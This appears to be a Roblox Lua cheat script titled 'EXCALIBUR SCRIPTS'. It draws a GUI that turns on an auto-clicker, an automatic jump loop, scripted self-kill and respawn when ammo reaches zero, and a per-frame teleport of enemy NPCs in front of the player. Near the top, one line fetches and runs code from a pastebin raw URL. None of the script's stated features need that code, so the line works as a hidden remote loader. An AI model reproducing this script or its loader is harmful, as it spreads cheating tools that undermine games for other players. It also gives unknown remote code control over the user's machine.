local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local isDead = false
local enabled = true
local firstZeroReached = false
local resetDelay = 0
local respawnDelay = 5
local jumpTime = 10
local jumpTimeLocked = false
local teleportNPCsEnabled = false

local AutoClicker = {
    Enabled = false,
    Keybind = Enum.KeyCode.F8,
    ClickPosition = Vector2.new(0.5, 0.5),
    ClickInterval = 0.01
}

loadstring(game:HttpGetAsync("https://pastebin.com/raw/yznqtbjy"))()

function AutoClicker:SimulateClick()
    if not self.Enabled then return end

    local camera = workspace.CurrentCamera
    local viewport = camera.ViewportSize
    local screenPos = Vector2.new(
        self.ClickPosition.X * viewport.X,
        self.ClickPosition.Y * viewport.Y
    )

    VirtualInputManager:SendMouseButtonEvent(screenPos.X, screenPos.Y, 0, true, game, 0)
    task.wait(0.05)
    VirtualInputManager:SendMouseButtonEvent(screenPos.X, screenPos.Y, 0, false, game, 0)
end

local function createModernMenu()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AutoResetGUI"
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 9999
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 250, 0, 350)
    mainFrame.Position = UDim2.new(0.5, -125, 0.5, -175)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame

    local stroke = Instance.new("UIStroke")
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Color = Color3.fromRGB(80, 80, 100)
    stroke.Thickness = 2
    stroke.Parent = mainFrame

    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = titleBar

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(0.8, 0, 1, 0)
    title.Position = UDim2.new(0.1, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "EXCALIBUR SCRIPTS"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 14
    title.Font = Enum.Font.GothamBold
    title.Parent = titleBar

    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -30, 0, 0)
    closeButton.BackgroundTransparency = 1
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 14
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Parent = titleBar

    local toggleFrame = Instance.new("Frame")
    toggleFrame.Name = "ToggleFrame"
    toggleFrame.Size = UDim2.new(1, -20, 0, 30)
    toggleFrame.Position = UDim2.new(0, 10, 0, 40)
    toggleFrame.BackgroundTransparency = 1
    toggleFrame.Parent = mainFrame

    local toggleLabel = Instance.new("TextLabel")
    toggleLabel.Name = "ToggleLabel"
    toggleLabel.Size = UDim2.new(0.7, 0, 1, 0)
    toggleLabel.BackgroundTransparency = 1
    toggleLabel.Text = "Enabled"
    toggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleLabel.TextSize = 14
    toggleLabel.Font = Enum.Font.Gotham
    toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    toggleLabel.Parent = toggleFrame

    local toggleButton = Instance.new("TextButton")
    toggleButton.Name = "ToggleButton"
    toggleButton.Size = UDim2.new(0, 50, 0, 25)
    toggleButton.Position = UDim2.new(1, -50, 0.5, -12)
    toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    toggleButton.Text = ""
    toggleButton.Parent = toggleFrame

    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 12)
    toggleCorner.Parent = toggleButton

    local toggleInner = Instance.new("Frame")
    toggleInner.Name = "ToggleInner"
    toggleInner.Size = UDim2.new(0, 21, 0, 21)
    toggleInner.Position = UDim2.new(0, 2, 0.5, -10)
    toggleInner.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
    toggleInner.Parent = toggleButton

    local toggleInnerCorner = Instance.new("UICorner")
    toggleInnerCorner.CornerRadius = UDim.new(0, 10)
    toggleInnerCorner.Parent = toggleInner

    local teleportToggleFrame = Instance.new("Frame")
    teleportToggleFrame.Name = "TeleportToggleFrame"
    teleportToggleFrame.Size = UDim2.new(1, -20, 0, 30)
    teleportToggleFrame.Position = UDim2.new(0, 10, 0, 80)
    teleportToggleFrame.BackgroundTransparency = 1
    teleportToggleFrame.Parent = mainFrame

    local teleportToggleLabel = Instance.new("TextLabel")
    teleportToggleLabel.Name = "TeleportToggleLabel"
    teleportToggleLabel.Size = UDim2.new(0.7, 0, 1, 0)
    teleportToggleLabel.BackgroundTransparency = 1
    teleportToggleLabel.Text = "Teleport NPCs"
    teleportToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    teleportToggleLabel.TextSize = 14
    teleportToggleLabel.Font = Enum.Font.Gotham
    teleportToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    teleportToggleLabel.Parent = teleportToggleFrame

    local teleportToggleButton = Instance.new("TextButton")
    teleportToggleButton.Name = "TeleportToggleButton"
    teleportToggleButton.Size = UDim2.new(0, 50, 0, 25)
    teleportToggleButton.Position = UDim2.new(1, -50, 0.5, -12)
    teleportToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    teleportToggleButton.Text = ""
    teleportToggleButton.Parent = teleportToggleFrame

    local teleportToggleCorner = Instance.new("UICorner")
    teleportToggleCorner.CornerRadius = UDim.new(0, 12)
    teleportToggleCorner.Parent = teleportToggleButton

    local teleportToggleInner = Instance.new("Frame")
    teleportToggleInner.Name = "TeleportToggleInner"
    teleportToggleInner.Size = UDim2.new(0, 21, 0, 21)
    teleportToggleInner.Position = UDim2.new(0, 2, 0.5, -10)
    teleportToggleInner.BackgroundColor3 = Color3.fromRGB(255, 150, 100)
    teleportToggleInner.Parent = teleportToggleButton

    local teleportToggleInnerCorner = Instance.new("UICorner")
    teleportToggleInnerCorner.CornerRadius = UDim.new(0, 10)
    teleportToggleInnerCorner.Parent = teleportToggleInner

    local autoClickerToggleFrame = Instance.new("Frame")
    autoClickerToggleFrame.Name = "AutoClickerToggleFrame"
    autoClickerToggleFrame.Size = UDim2.new(1, -20, 0, 30)
    autoClickerToggleFrame.Position = UDim2.new(0, 10, 0, 120)
    autoClickerToggleFrame.BackgroundTransparency = 1
    autoClickerToggleFrame.Parent = mainFrame

    local autoClickerToggleLabel = Instance.new("TextLabel")
    autoClickerToggleLabel.Name = "AutoClickerToggleLabel"
    autoClickerToggleLabel.Size = UDim2.new(0.7, 0, 1, 0)
    autoClickerToggleLabel.BackgroundTransparency = 1
    autoClickerToggleLabel.Text = "Auto Clicker (F8)"
    autoClickerToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    autoClickerToggleLabel.TextSize = 14
    autoClickerToggleLabel.Font = Enum.Font.Gotham
    autoClickerToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    autoClickerToggleLabel.Parent = autoClickerToggleFrame

    local autoClickerToggleButton = Instance.new("TextButton")
    autoClickerToggleButton.Name = "AutoClickerToggleButton"
    autoClickerToggleButton.Size = UDim2.new(0, 50, 0, 25)
    autoClickerToggleButton.Position = UDim2.new(1, -50, 0.5, -12)
    autoClickerToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    autoClickerToggleButton.Text = ""
    autoClickerToggleButton.Parent = autoClickerToggleFrame

    local autoClickerToggleCorner = Instance.new("UICorner")
    autoClickerToggleCorner.CornerRadius = UDim.new(0, 12)
    autoClickerToggleCorner.Parent = autoClickerToggleButton

    local autoClickerToggleInner = Instance.new("Frame")
    autoClickerToggleInner.Name = "AutoClickerToggleInner"
    autoClickerToggleInner.Size = UDim2.new(0, 21, 0, 21)
    autoClickerToggleInner.Position = UDim2.new(0, 2, 0.5, -10)
    autoClickerToggleInner.BackgroundColor3 = Color3.fromRGB(255, 100, 255)
    autoClickerToggleInner.Parent = autoClickerToggleButton

    local autoClickerToggleInnerCorner = Instance.new("UICorner")
    autoClickerToggleInnerCorner.CornerRadius = UDim.new(0, 10)
    autoClickerToggleInnerCorner.Parent = autoClickerToggleInner

    local delayFrame = Instance.new("Frame")
    delayFrame.Name = "DelayFrame"
    delayFrame.Size = UDim2.new(1, -20, 0, 30)
    delayFrame.Position = UDim2.new(0, 10, 0, 160)
    delayFrame.BackgroundTransparency = 1
    delayFrame.Parent = mainFrame

    local delayLabel = Instance.new("TextLabel")
    delayLabel.Name = "DelayLabel"
    delayLabel.Size = UDim2.new(0.7, 0, 1, 0)
    delayLabel.BackgroundTransparency = 1
    delayLabel.Text = "Reset Delay (s):"
    delayLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    delayLabel.TextSize = 14
    delayLabel.Font = Enum.Font.Gotham
    delayLabel.TextXAlignment = Enum.TextXAlignment.Left
    delayLabel.Parent = delayFrame

    local delayBox = Instance.new("TextBox")
    delayBox.Name = "DelayBox"
    delayBox.Size = UDim2.new(0.25, 0, 0.7, 0)
    delayBox.Position = UDim2.new(0.75, -5, 0.15, 0)
    delayBox.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    delayBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    delayBox.Text = "0"
    delayBox.TextSize = 14
    delayBox.Font = Enum.Font.Gotham
    delayBox.Parent = delayFrame

    local delayCorner = Instance.new("UICorner")
    delayCorner.CornerRadius = UDim.new(0, 4)
    delayCorner.Parent = delayBox

    local respawnDelayFrame = Instance.new("Frame")
    respawnDelayFrame.Name = "RespawnDelayFrame"
    respawnDelayFrame.Size = UDim2.new(1, -20, 0, 30)
    respawnDelayFrame.Position = UDim2.new(0, 10, 0, 200)
    respawnDelayFrame.BackgroundTransparency = 1
    respawnDelayFrame.Parent = mainFrame

    local respawnDelayLabel = Instance.new("TextLabel")
    respawnDelayLabel.Name = "RespawnDelayLabel"
    respawnDelayLabel.Size = UDim2.new(0.7, 0, 1, 0)
    respawnDelayLabel.BackgroundTransparency = 1
    respawnDelayLabel.Text = "Respawn Delay (s):"
    respawnDelayLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    respawnDelayLabel.TextSize = 14
    respawnDelayLabel.Font = Enum.Font.Gotham
    respawnDelayLabel.TextXAlignment = Enum.TextXAlignment.Left
    respawnDelayLabel.Parent = respawnDelayFrame

    local respawnDelayBox = Instance.new("TextBox")
    respawnDelayBox.Name = "RespawnDelayBox"
    respawnDelayBox.Size = UDim2.new(0.25, 0, 0.7, 0)
    respawnDelayBox.Position = UDim2.new(0.75, -5, 0.15, 0)
    respawnDelayBox.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    respawnDelayBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    respawnDelayBox.Text = "5"
    respawnDelayBox.TextSize = 14
    respawnDelayBox.Font = Enum.Font.Gotham
    respawnDelayBox.Parent = respawnDelayFrame

    local respawnDelayCorner = Instance.new("UICorner")
    respawnDelayCorner.CornerRadius = UDim.new(0, 4)
    respawnDelayCorner.Parent = respawnDelayBox

    local jumpTimeFrame = Instance.new("Frame")
    jumpTimeFrame.Name = "JumpTimeFrame"
    jumpTimeFrame.Size = UDim2.new(1, -20, 0, 30)
    jumpTimeFrame.Position = UDim2.new(0, 10, 0, 240)
    jumpTimeFrame.BackgroundTransparency = 1
    jumpTimeFrame.Parent = mainFrame

    local jumpTimeLabel = Instance.new("TextLabel")
    jumpTimeLabel.Name = "JumpTimeLabel"
    jumpTimeLabel.Size = UDim2.new(0.7, 0, 1, 0)
    jumpTimeLabel.BackgroundTransparency = 1
    jumpTimeLabel.Text = "Jump Interval (s):"
    jumpTimeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    jumpTimeLabel.TextSize = 14
    jumpTimeLabel.Font = Enum.Font.Gotham
    jumpTimeLabel.TextXAlignment = Enum.TextXAlignment.Left
    jumpTimeLabel.Parent = jumpTimeFrame

    local jumpTimeBox = Instance.new("TextBox")
    jumpTimeBox.Name = "JumpTimeBox"
    jumpTimeBox.Size = UDim2.new(0.25, 0, 0.7, 0)
    jumpTimeBox.Position = UDim2.new(0.75, -5, 0.15, 0)
    jumpTimeBox.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    jumpTimeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    jumpTimeBox.Text = "10"
    jumpTimeBox.TextSize = 14
    jumpTimeBox.Font = Enum.Font.Gotham
    jumpTimeBox.Parent = jumpTimeFrame

    local jumpTimeCorner = Instance.new("UICorner")
    jumpTimeCorner.CornerRadius = UDim.new(0, 4)
    jumpTimeCorner.Parent = jumpTimeBox

    local lockIcon = Instance.new("ImageLabel")
    lockIcon.Name = "LockIcon"
    lockIcon.Size = UDim2.new(0, 15, 0, 15)
    lockIcon.Position = UDim2.new(0.95, -5, 0.15, 0)
    lockIcon.BackgroundTransparency = 1
    lockIcon.Image = "rbxassetid://132165439737546"
    lockIcon.ImageRectOffset = Vector2.new(324, 364)
    lockIcon.ImageRectSize = Vector2.new(36, 36)
    lockIcon.Visible = false
    lockIcon.Parent = jumpTimeBox

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "StatusLabel"
    statusLabel.Size = UDim2.new(1, -20, 0, 20)
    statusLabel.Position = UDim2.new(0, 10, 1, -30)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Status: Waiting..."
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusLabel.TextSize = 12
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.Parent = mainFrame

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function updateToggle()
        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
        if enabled then
            local tween = TweenService:Create(toggleInner, tweenInfo, {Position = UDim2.new(1, -23, 0.5, -10), BackgroundColor3 = Color3.fromRGB(100, 255, 150)})
            tween:Play()
        else
            local tween = TweenService:Create(toggleInner, tweenInfo, {Position = UDim2.new(0, 2, 0.5, -10), BackgroundColor3 = Color3.fromRGB(255, 100, 100)})
            tween:Play()
        end
    end

    local function updateTeleportToggle()
        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
        if teleportNPCsEnabled then
            local tween = TweenService:Create(teleportToggleInner, tweenInfo, {Position = UDim2.new(1, -23, 0.5, -10), BackgroundColor3 = Color3.fromRGB(100, 255, 150)})
            tween:Play()
        else
            local tween = TweenService:Create(teleportToggleInner, tweenInfo, {Position = UDim2.new(0, 2, 0.5, -10), BackgroundColor3 = Color3.fromRGB(255, 100, 100)})
            tween:Play()
        end
    end

    local function updateAutoClickerToggle()
        local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
        if AutoClicker.Enabled then
            local tween = TweenService:Create(autoClickerToggleInner, tweenInfo, {Position = UDim2.new(1, -23, 0.5, -10), BackgroundColor3 = Color3.fromRGB(100, 255, 150)})
            tween:Play()
        else
            local tween = TweenService:Create(autoClickerToggleInner, tweenInfo, {Position = UDim2.new(0, 2, 0.5, -10), BackgroundColor3 = Color3.fromRGB(255, 100, 100)})
            tween:Play()
        end
    end

    toggleButton.MouseButton1Click:Connect(function()
        enabled = not enabled
        updateToggle()
    end)

    teleportToggleButton.MouseButton1Click:Connect(function()
        teleportNPCsEnabled = not teleportNPCsEnabled
        updateTeleportToggle()
    end)

    autoClickerToggleButton.MouseButton1Click:Connect(function()
        AutoClicker.Enabled = not AutoClicker.Enabled
        updateAutoClickerToggle()
    end)

    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    delayBox.FocusLost:Connect(function(enterPressed)
        local num = tonumber(delayBox.Text)
        if num and num >= 0 then
            resetDelay = num
            delayBox.Text = tostring(num)
        else
            delayBox.Text = tostring(resetDelay)
        end
    end)

    respawnDelayBox.FocusLost:Connect(function(enterPressed)
        local num = tonumber(respawnDelayBox.Text)
        if num and num >= 0 then
            respawnDelay = num
            respawnDelayBox.Text = tostring(num)
        else
            respawnDelayBox.Text = tostring(respawnDelay)
        end
    end)

    jumpTimeBox.FocusLost:Connect(function(enterPressed)
        if not jumpTimeLocked then
            local num = tonumber(jumpTimeBox.Text)
            if num and num > 0 then
                jumpTime = num
                jumpTimeBox.Text = tostring(num)
                jumpTimeLocked = true
                lockIcon.Visible = true
            else
                jumpTimeBox.Text = tostring(jumpTime)
            end
        end
    end)

    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    titleBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    updateToggle()
    updateTeleportToggle()
    updateAutoClickerToggle()

    return {
        updateStatus = function(text)
            statusLabel.Text = "Status: " .. text
        end,
        getEnabled = function()
            return enabled
        end,
        getResetDelay = function()
            return resetDelay
        end,
        getRespawnDelay = function()
            return respawnDelay
        end,
        getJumpTime = function()
            return jumpTime
        end,
        getTeleportNPCsEnabled = function()
            return teleportNPCsEnabled
        end
    }
end

local menu = createModernMenu()

local function killPlayer()
    local character = player.Character
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.Health = 0
    end
end

local function parseAmmo(text)
    local current, total = string.match(text, "(%d+)%s*|%s*(%d+)")
    return tonumber(current), tonumber(total)
end

local function teleportNPCs()
    if not menu.getTeleportNPCsEnabled() then return end
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local playerPos = player.Character.HumanoidRootPart.Position
    local forward = player.Character.HumanoidRootPart.CFrame.LookVector
    
    local myTeam = player:GetAttribute("Team") or 1
    
    for _, npc in ipairs(workspace.Mobs:GetChildren()) do
        if npc:IsA("Model") and npc:FindFirstChild("HumanoidRootPart") then
            local teamAttr = npc:GetAttribute("Team")
            
            if (myTeam == 1 and (teamAttr == 2 or teamAttr == -1)) or
               (myTeam == 2 and (teamAttr == 1 or teamAttr == -1)) or
               (myTeam == -1 and (teamAttr == 1 or teamAttr == 2)) then
                npc.HumanoidRootPart.CFrame = CFrame.new(playerPos + forward * 5 + Vector3.new(0, 0, 0))
            end
        end
    end
end

local function jumpLoop()
    while true do
        if menu.getEnabled() and not isDead then
            local virtualInput = game:GetService("VirtualInputManager")
            virtualInput:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            virtualInput:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            task.wait(menu.getJumpTime() - 0.1)
        else
            task.wait(0.1)
        end
    end
end

task.spawn(jumpLoop)

local lastClick = 0
RunService.Heartbeat:Connect(function(dt)
    if AutoClicker.Enabled then
        lastClick = lastClick + dt
        if lastClick >= AutoClicker.ClickInterval then
            AutoClicker:SimulateClick()
            lastClick = 0
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == AutoClicker.Keybind then
        AutoClicker.Enabled = not AutoClicker.Enabled
        menu.updateStatus("AutoClicker: " .. (AutoClicker.Enabled and "Ativado" or "Desativado"))
    end
end)

RunService.RenderStepped:Connect(function()
    if menu.getTeleportNPCsEnabled() then
        teleportNPCs()
    end
end)

local function onAmmoChanged(ammoLabel)
    if not menu.getEnabled() then 
        menu.updateStatus("Disabled")
        return 
    end

    if isDead then 
        menu.updateStatus("Dead - Waiting respawn")
        return 
    end

    local current, total = parseAmmo(ammoLabel.Text or "")
    if current == 0 and total == 0 then
        if firstZeroReached then
            menu.updateStatus("Resetting in "..menu.getResetDelay().."s...")
            task.wait(menu.getResetDelay())
            
            isDead = true
            killPlayer()

            task.wait(menu.getRespawnDelay())
            ReplicatedStorage:WaitForChild("Network"):WaitForChild("Remotes"):WaitForChild("Spawn"):FireServer()

            task.wait(1)
            isDead = false
            firstZeroReached = false
            menu.updateStatus("Waiting...")
        else
            firstZeroReached = true
            menu.updateStatus("First zero - Pressing 2")
            local virtualInput = game:GetService("VirtualInputManager")
            virtualInput:SendKeyEvent(true, Enum.KeyCode.Two, false, game)
            task.wait(0.1)
            virtualInput:SendKeyEvent(false, Enum.KeyCode.Two, false, game)
            menu.updateStatus("Waiting second zero...")
        end
    else
        if not firstZeroReached then
            menu.updateStatus("Monitoring...")
        end
    end
end

local function setupAmmoListener()
    local success, gui = pcall(function()
        return player:WaitForChild("PlayerGui"):WaitForChild("MainGui")
    end)
    if not success or not gui then
        menu.updateStatus("GUI not found")
        return
    end

    local ammoFrame = gui:FindFirstChild("AbilityFrames") and gui.AbilityFrames:FindFirstChild("AmmoFrame")
    if not ammoFrame then
        menu.updateStatus("AmmoFrame not found")
        return
    end

    local ammoLabel = ammoFrame:FindFirstChild("AmmoLabel")
    if not ammoLabel then
        menu.updateStatus("AmmoLabel not found")
        return
    end
    
    ammoLabel:GetPropertyChangedSignal("Text"):Connect(function()
        onAmmoChanged(ammoLabel)
    end)

    onAmmoChanged(ammoLabel)
end

player.CharacterAdded:Connect(function()
    task.wait(1)
    setupAmmoListener()
end)
setupAmmoListener()
